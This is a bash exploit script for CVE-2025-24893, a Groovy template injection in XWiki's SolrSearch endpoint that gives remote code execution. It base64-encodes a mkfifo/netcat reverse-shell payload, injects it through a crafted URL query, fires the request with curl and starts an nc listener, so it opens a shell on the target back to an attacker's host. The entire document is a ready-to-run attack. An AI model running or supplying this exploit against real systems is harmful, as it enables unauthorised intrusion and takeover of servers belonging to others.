#! /bin/bash

if [[ -z $1 || -z $2 || -z $3 ]];then
        echo -e "Usage: CVE-2025-24893.sh <TARGET> <LHOST> <LPORT>"
        echo -e "Example: CVE-2025-24893.sh https://example.local 10.10.10.10 4444"
        exit 1
fi

TARGET=$1
LHOST=$2
LPORT=$3

# create exploit
MKFIFO_PAYLOAD="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${LHOST} ${LPORT} >/tmp/f"
ENCODED_PAYLOAD=$(echo -n "${MKFIFO_PAYLOAD}" | base64 | tr -d '\n')

# craft request
QUERY_PAYLOAD="%7D%7D%7D%7B%7Basync%20async=false%7D%7D%7B%7Bgroovy%7D%7D%5B%22sh%22,%20%22-c%22,%20%22echo%20${ENCODED_PAYLOAD}%20%7C%20base64%20-d%20%7C%20sh%22%5D.execute()%7B%7B/groovy%7D%7D%7B%7B/async%7D%7D"
REQUEST_URL="${TARGET}/xwiki/bin/get/Main/SolrSearch?media=rss&text=${QUERY_PAYLOAD}"
echo "[+] Malicious request crafted: ${REQUEST_URL}"

# check if a listener is already running
netstat -tulpn 2>/dev/null | grep -q $LPORT
if [ $? -ne 0 ]; then
        (sleep 5; curl -s -o /dev/null $REQUEST_URL) &
        nc -lnvp 4444
else
        curl $REQUEST_URL
fi
